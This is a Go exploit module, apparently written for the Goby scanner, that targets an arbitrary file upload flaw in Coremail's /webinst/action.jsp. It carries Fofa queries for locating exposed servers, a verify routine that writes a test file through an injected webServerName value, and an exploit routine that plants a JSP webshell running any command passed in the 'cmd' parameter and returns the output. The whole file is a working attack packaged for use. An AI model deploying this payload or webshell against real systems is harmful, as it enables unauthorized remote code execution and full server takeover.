package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Coremail action.jsp file upload getshell",
    "Description": "Coremail has arbitrary file upload vulnerabilities in its specific version range. Attackers can upload webshells to cause remote code execution.",
    "Impact": "Coremail action.jsp file upload getshell",
    "Recommendation": "<p>The vulnerability has been fixed by the manufacturer, please contact the manufacturer to fix it:</p><p><a href=\"http://www.inspur.com/\">http://www.inspur. com/</a></p>",
    "Product": "Coremail",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload",
        "2H1W"
    ],
    "Translation": {
        "CN": {
            "Name": "Coremail论客邮件系统action.jsp文件上传GetShell",
            "Description": "<p>Coremail论客邮件系统采用分布式系统架构，经过20年的深入研发和完善，系统技术成熟，性能稳定高效，是众多知名企业及政府高校搭建邮件服务器系统及企业邮箱的首选方案.。Coremail论客邮件系统action.jsp文件存在文件上传漏洞可导致GetShell，攻击者可在服务器上写入后门，从而入侵服务器，获取服务器的管理员权限，危害巨大。<br></p>",
            "Impact": "<p>Coremail论客邮件系统采用分布式系统架构，经过20年的深入研发和完善，系统技术成熟，性能稳定高效，是众多知名企业及政府高校搭建邮件服务器系统及企业邮箱的首选方案。</p><p>Coremail论客邮件系统action.jsp文件存在文件上传漏洞可导致GetShell，攻击者可在服务器上写入后门，从而入侵服务器，获取服务器的管理员权限，危害巨大。<br></p>",
            "Recommendation": "<p>厂商已修复该漏洞，请用户联系厂商进行修复：</p><p><a href=\"http://www.inspur.com/\">http://www.inspur.com/</a><br></p>",
            "Product": "Coremail-邮件系统",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Coremail action.jsp file upload getshell",
            "Description": "Coremail has arbitrary file upload vulnerabilities in its specific version range. Attackers can upload webshells to cause remote code execution.",
            "Impact": "Coremail action.jsp file upload getshell",
            "Recommendation": "<p>The vulnerability has been fixed by the manufacturer, please contact the manufacturer to fix it:</p><p><a href=\"http://www.inspur.com/\">http://www.inspur. com/</a><br></p>",
            "Product": "Coremail",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "2H1W"
            ]
        }
    },
    "FofaQuery": "body=\"/coremail/common/\" || title=\"Coremail邮件系统\" || (protocol=\"smtp\" && banner=\"coremail\") || title=\"Coremail 电子邮局\" || body=\"action=\\\"/coremail/index.jsp\" || body=\"fmt_logoAlt: \\\"Coremail 电子邮件系统\" || banner=\"coremail Mail\"",
    "GobyQuery": "body=\"/coremail/common/\" || title=\"Coremail邮件系统\" || (protocol=\"smtp\" && banner=\"coremail\") || title=\"Coremail 电子邮局\" || body=\"action=\\\"/coremail/index.jsp\" || body=\"fmt_logoAlt: \\\"Coremail 电子邮件系统\" || banner=\"coremail Mail\"",
    "Author": "itardc@163.com",
    "Homepage": "http://www.coremail.cn",
    "DisclosureDate": "2021-04-13",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "Coremail"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomFilename := goutils.RandomHexString(8)
			randomContent := goutils.RandomHexString(8)
			cfg := httpclient.NewPostRequestConfig("/webinst/action.jsp")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf("func=checkserver&webServerName=127.0.0.1:6132/%%0d@/home/coremail/web/webapp/%s.jsp%%20%s\"", randomFilename, randomContent)
			httpclient.DoHttpRequest(u, cfg)
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + "/coremail/" + randomFilename + ".jsp"); err == nil {
				ss.VulURL = u.FixedHostInfo + "/coremail/" + randomFilename + ".jsp"
				return strings.Contains(resp.Utf8Html, randomContent)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			randomFilename := goutils.RandomHexString(8)
			webshell := "<%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();"
			webshell += "int a = -1;"
			webshell += "byte[] b = new byte[2048];"
			webshell += "while((a=in.read(b))!=-1){out.println(new String(b));}"
			webshell += "%>"
			webshell = url.PathEscape(webshell)
			cfg := httpclient.NewPostRequestConfig("/webinst/action.jsp")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf("func=checkserver&webServerName=127.0.0.1:6132/%%0d@/home/coremail/web/webapp/%s.jsp%%20%s\"", randomFilename, webshell)
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			cmd := ss.Params["cmd"].(string)
			time.Sleep(time.Second * 2)
			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/coremail/" + randomFilename + ".jsp?cmd=" + cmd); err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}
